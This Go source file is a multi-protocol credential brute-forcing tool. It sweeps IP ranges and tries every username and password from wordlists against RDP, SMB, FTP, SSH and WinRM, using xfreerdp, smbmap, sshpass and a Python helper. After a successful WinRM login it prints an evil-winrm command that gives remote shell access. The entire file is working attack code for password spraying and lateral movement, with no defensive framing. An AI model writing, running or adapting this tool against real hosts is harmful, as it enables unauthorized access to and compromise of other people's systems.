package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec" // Only one import for os/exec
	"strconv" // This is needed for strconv.Atoi in expandHostRange
	"strings"
	"sync"
	"time"
)

var consoleMutex sync.Mutex

func checkSMB(username string, password string, host string, domain string, passwordCounter string) bool {
	// Construct the smbmap command
	var cmdArgs []string
	cmdArgs = append(cmdArgs, "-u", username, "-p", password, "-H", host)

	// Conditionally include the domain if it's provided
	if domain != "" {
		cmdArgs = append(cmdArgs, "-d", domain)
	}

	cmd := exec.Command("smbmap", cmdArgs...)
	// Redirect the standard output and error to capture the command's output
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	// Run the smbmap command
	err := cmd.Run()

	if err != nil {
		fmt.Printf("Failed SMB on %s with %s/%s: %s\n", host, username, password, out.String())
		return false
	}

	consoleMutex.Lock()
	fmt.Printf("\r%100s", "") // Print 100 spaces (adjust the number as needed)
	fmt.Printf("\r\033[33mTesting password #%s: \033[31m%s\033[0m on %s with username \033[31m%s\033[0m", passwordCounter, password, host, username)
	os.Stdout.Sync()
	consoleMutex.Unlock()
	result := extractSMBMapResult(out.String())
	if strings.Contains(result, "Authentication failed") {
		// If you want to print a line break after a failed attempt, uncomment the next line
		// fmt.Println()
		return false
	}

	fmt.Printf("\n\033[34mYou are connected to SMB on port 445 with credentials: %s : %s\033[0m\n", username, password)
	fmt.Println(result)

	return true
}

func extractSMBMapResult(output string) string {
	lines := strings.Split(output, "\n")

	var result strings.Builder
	var capture bool

	for _, line := range lines {
		if strings.Contains(line, "[+] IP:") {
			capture = true
		}
		if capture {
			result.WriteString(line + "\n")
		}
	}

	if result.Len() == 0 {
		return "Authentication failed or SMBMap result not found in output."
	}

	return result.String()
}

func checkFTP(username, password, host string) bool {
	// Prepare the FTP command sequence
	ftpCmd := fmt.Sprintf("open %s\nuser %s %s\nbye\n", host, username, password)
	cmd := exec.Command("ftp")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	// Pipe the commands into the FTP client
	stdin, err := cmd.StdinPipe()
	if err != nil {
		fmt.Printf("Failed to open stdin to ftp command: %s\n", err)
		return false
	}

	// Start the FTP client
	if err := cmd.Start(); err != nil {
		fmt.Printf("Failed to start ftp command: %s\n", err)
		return false
	}

	// Send the commands to the FTP client
	_, err = stdin.Write([]byte(ftpCmd))
	if err != nil {
		fmt.Printf("Failed to write to stdin: %s\n", err)
		return false
	}
	stdin.Close()

	// Wait for the FTP client to finish
	err = cmd.Wait()

	if err != nil {
		fmt.Printf("FTP login failed on %s with %s/%s: %s\n", host, username, password, out.String())
		return false
	}

	fmt.Printf("\033[34mSuccess FTP on %s with %s/%s\033[0m\n", host, username, password)
	return true
}

func checkSSH(username, password, host string) bool {
	// Using sshpass for simplicity; replace with appropriate SSH handling logic
	cmd := exec.Command("sshpass", "-p", password, "ssh", fmt.Sprintf("%s@%s", username, host), "exit")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()

	if err != nil {
		fmt.Printf("Failed SSH on %s with %s/%s: %s\n", host, username, password, out.String())
		return false
	}

	fmt.Printf("\033[34mSuccess SSH on %s with %s/%s\033[0m\n", host, username, password)
	return true
}
func checkWinRM(username, password, host string) bool {
	// Construct the command to run the Python script
	cmd := exec.Command("python", "winrm_check.py", host, username, password)

	// Capture the output of the Python script
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Failed WinRM on %s with %s/%s: %s\n", host, username, password, output)
		return false
	}

	if err != nil {
		// handle error
	} else {
		fmt.Printf("\033[34mSuccess WinRM on %s with %s/%s\033[0m\n", host, username, password)

		// Construct the command you intend to execute
		command := fmt.Sprintf("evil-winrm -i %s -u %s -p %s", host, username, password)

		// Print the command for the user
		fmt.Printf("Command to be executed: \033[32m%s\033[0m\n", command)

	}

	return true
}

func checkRDP(username, password, host string) bool {
	cmd := exec.Command("xfreerdp", fmt.Sprintf("/u:%s", username), fmt.Sprintf("/p:%s", password), fmt.Sprintf("/v:%s", host))
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()

	if err != nil {
		fmt.Printf("Failed on %s with %s/%s: %s\n", host, username, password, out.String())
		return false
	}

	fmt.Printf("Success on %s with %s/%s\n", host, username, password)
	return true
}

func isPortOpen(host string, port string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), timeout)
	if err != nil {
		return false
	}
	if conn != nil {
		defer conn.Close()
		return true
	}
	return false
}
func expandHostRange(hostRange string) ([]string, error) {
	var expandedHosts []string
	parts := strings.Split(hostRange, "-")

	if len(parts) == 1 {
		// Single host, not a range
		return []string{hostRange}, nil
	} else if len(parts) == 2 {
		// It's a range
		baseParts := strings.Split(parts[0], ".")
		if len(baseParts) != 4 {
			return nil, fmt.Errorf("invalid IP address format")
		}

		start, err := strconv.Atoi(baseParts[3])
		if err != nil {
			return nil, err
		}

		end, err := strconv.Atoi(parts[1])
		if err != nil {
			return nil, err
		}

		for i := start; i <= end; i++ {
			host := fmt.Sprintf("%s.%s.%s.%d", baseParts[0], baseParts[1], baseParts[2], i)
			expandedHosts = append(expandedHosts, host)
		}

		return expandedHosts, nil
	} else {
		return nil, fmt.Errorf("invalid range format")
	}
}

func main() {
	var singleUsername, singlePassword string
	flag.StringVar(&singleUsername, "u", "", "Single username")
	flag.StringVar(&singlePassword, "p", "", "Single password")
	var domain string
	flag.StringVar(&domain, "d", "", "Domain")
	usernameFile := flag.String("uf", "", "Username file")
	passwordFile := flag.String("pf", "", "Password file")
	passwordCounter := 0
	flag.Parse()

	var allHosts []string
	for _, arg := range flag.Args() {
		expandedHosts, err := expandHostRange(arg)
		if err != nil {
			fmt.Printf("Error expanding host range '%s': %v\n", arg, err)
			continue
		}
		allHosts = append(allHosts, expandedHosts...)
	}

	var usernames, passwords []string
	var err error

	if *usernameFile != "" {
		usernames, err = readLines(*usernameFile)
		if err != nil {
			fmt.Printf("Error reading username file: %v\n", err)
			return
		}
	} else {
		usernames = []string{singleUsername}
	}

	if *passwordFile != "" {
		passwords, err = readLines(*passwordFile)
		if err != nil {
			fmt.Printf("Error reading password file: %v\n", err)
			return
		}
	} else {
		passwords = []string{singlePassword}
	}

	for hostIndex, host := range allHosts {
		// Display a yellow message when starting to scan a host
		fmt.Printf("\033[33mScanning host %d/%d (%s)...\033[0m\n", hostIndex+1, len(allHosts), host)

		if isPortOpen(host, "3389", 5*time.Second) { // Check for RDP port
			for _, username := range usernames {
				for _, password := range passwords {
					checkRDP(username, password, host)
				}
			}
		} else {
			fmt.Printf("RDP port is closed on %s, skipping RDP check.\n", host)
		}

		if isPortOpen(host, "445", 5*time.Second) {
			for _, username := range usernames {
				for _, password := range passwords {
					passwordCounter++
					checkSMB(username, password, host, domain, strconv.Itoa(passwordCounter))
				}
			}
		} else {
			fmt.Printf("SMB port is closed on %s, skipping SMB check.\n", host)
		}

		if isPortOpen(host, "21", 5*time.Second) {
			for _, username := range usernames {
				for _, password := range passwords {
					checkFTP(username, password, host)
				}
			}
		} else {
			fmt.Printf("FTP port is closed on %s, skipping FTP check.\n", host)
		}

		if isPortOpen(host, "22", 5*time.Second) {
			for _, username := range usernames {
				for _, password := range passwords {
					checkSSH(username, password, host)
				}
			}
		} else {
			fmt.Printf("SSH port is closed on %s, skipping SSH check.\n", host)
		}

		if isPortOpen(host, "5985", 5*time.Second) {
			for _, username := range usernames {
				for _, password := range passwords {
					checkWinRM(username, password, host)
				}
			}
		} else {
			fmt.Printf("WinRM port is closed on %s, skipping WinRM check.\n", host)
		}
	}

}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, strings.TrimSpace(scanner.Text()))
	}
	return lines, scanner.Err()
}
